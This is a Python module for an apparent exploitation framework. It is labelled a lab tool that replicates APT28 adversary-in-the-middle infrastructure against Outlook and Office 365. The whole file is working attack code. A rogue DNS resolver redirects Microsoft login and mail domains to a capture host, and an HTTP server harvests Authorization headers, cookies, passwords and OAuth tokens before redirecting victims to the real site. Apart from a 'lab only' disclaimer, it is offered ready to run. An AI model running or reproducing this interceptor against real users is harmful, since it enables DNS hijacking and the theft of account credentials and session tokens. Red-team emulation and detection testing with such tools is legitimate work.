# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

from embedxpl.core.exploit import *
from embedxpl.core.exploit.exploit import Exploit as BaseExploit


class _CredHandler(BaseHTTPRequestHandler):
    """Captures Authorization, cookies, and OAuth tokens from inbound requests."""
    captured = []

    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        self._capture()
        self.send_response(302)
        self.send_header("Location", "https://outlook.office365.com")
        self.end_headers()

    def do_POST(self):
        cl = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(cl).decode("utf-8", errors="replace") if cl else ""
        self._capture(body)
        self.send_response(302)
        self.send_header("Location", "https://outlook.office365.com")
        self.end_headers()

    def _capture(self, body: str = "") -> None:
        e = {
            "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "ip": self.client_address[0],
            "method": self.command, "path": self.path,
            "host": self.headers.get("Host", ""),
        }
        auth = self.headers.get("Authorization", "")
        if auth:
            e["auth"] = auth
        cookies = self.headers.get("Cookie", "")
        if cookies:
            e["cookies"] = cookies
        if body and any(k in body.lower() for k in ("password", "token", "grant_type")):
            e["body"] = body[:2000]
        _CredHandler.captured.append(e)


class _DNS(threading.Thread):
    """Minimal DNS that resolves targeted Outlook domains to capture IP."""
    TARGETS = {
        "autodiscover-s.outlook.com", "imap-mail.outlook.com",
        "outlook.live.com", "outlook.office.com", "outlook.office365.com",
        "login.microsoftonline.com", "smtp-mail.outlook.com",
    }

    def __init__(self, bind: str, port: int, redir: str):
        super().__init__(daemon=True)
        self.bind, self.port, self.redir = bind, port, redir
        self._stop = threading.Event()

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.settimeout(1.0)
        try:
            s.bind((self.bind, self.port))
        except OSError:
            return
        while not self._stop.is_set():
            try:
                data, addr = s.recvfrom(1024)
            except socket.timeout:
                continue
            domain = self._parse(data)
            if domain and domain.rstrip(".") in self.TARGETS:
                s.sendto(self._answer(data, self.redir), addr)
            else:
                s.sendto(self._nxdomain(data), addr)
        s.close()

    def stop(self):
        self._stop.set()

    @staticmethod
    def _parse(data):
        if len(data) < 12:
            return ""
        off, labels = 12, []
        while off < len(data) and data[off]:
            n = data[off]; off += 1
            labels.append(data[off:off + n].decode("ascii", errors="replace")); off += n
        return ".".join(labels)

    @staticmethod
    def _answer(q, ip):
        tid = q[:2]
        f = struct.pack(">H", 0x8180)
        c = struct.pack(">HHHH", 1, 1, 0, 0)
        qs = q[12:]; qe = qs.find(b"\x00") + 5
        ans = b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, 300, 4) + socket.inet_aton(ip)
        return tid + f + c + qs[:qe] + ans

    @staticmethod
    def _nxdomain(q):
        tid = q[:2]
        f = struct.pack(">H", 0x8183)
        c = struct.pack(">HHHH", 1, 0, 0, 0)
        qs = q[12:]; qe = qs.find(b"\x00") + 5
        return tid + f + c + qs[:qe]


class Exploit(BaseExploit):
    """AITM Credential Interceptor — APT28 Lab Validation Tool.

    Runs malicious DNS + HTTP capture to intercept Outlook credentials.
    For controlled lab environments only.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "AITM Credential Interceptor (APT28 Lab Tool)",
        "description": (
            "Lab tool replicating APT28 AITM infrastructure. Runs local "
            "malicious DNS resolver + HTTP credential capture for Outlook/O365 "
            "domains. Captures Authorization headers, cookies, OAuth tokens. "
            "For controlled lab environments only."
        ),
        "authors": ("André Henrique (@mrhenrike)",),
        "references": (
            "https://www.tomshardware.com/tech-industry/cyber-security/ncsc-says-russian-gru-hackers-are-hijacking-tp-link-and-mikrotik-routers",
        ),
        "devices": ("Lab infrastructure (attacker-side)",),
    }

    target = OptIP("0.0.0.0", "Bind IP")
    port = OptPort(8443, "HTTP capture port")
    dns_port = OptPort(5353, "DNS port (53 if root)")
    capture_ip = OptString("", "IP to resolve targets to (your lab IP)")
    duration = OptInteger(120, "Capture duration in seconds")

    def run(self) -> None:
        if not self.capture_ip:
            print_error("capture_ip required"); return

        _CredHandler.captured = []
        print_status("AITM: DNS={}:{}, HTTP={}:{}, redirect={}".format(
            self.target, self.dns_port, self.target, self.port, self.capture_ip))

        dns = _DNS(str(self.target), int(self.dns_port), str(self.capture_ip))
        dns.start()

        try:
            httpd = HTTPServer((str(self.target), int(self.port)), _CredHandler)
        except OSError as e:
            print_error("HTTP bind failed: {}".format(e)); dns.stop(); return

        t = threading.Thread(target=httpd.serve_forever, daemon=True)
        t.start()
        print_success("AITM running — {} seconds".format(self.duration))

        try:
            time.sleep(int(self.duration))
        except KeyboardInterrupt:
            pass

        httpd.shutdown(); dns.stop()
        print_status("=== {} request(s) captured ===".format(len(_CredHandler.captured)))
        for e in _CredHandler.captured:
            print_info("  [{ts}] {ip} {method} {path}".format(**e))
            if "auth" in e:
                print_success("    AUTH: {}".format(e["auth"][:200]))
            if "cookies" in e:
                print_info("    COOKIES: {}".format(e["cookies"][:200]))
            if "body" in e:
                print_success("    BODY: {}".format(e["body"][:200]))

    @mute
    def check(self) -> None:
        return None
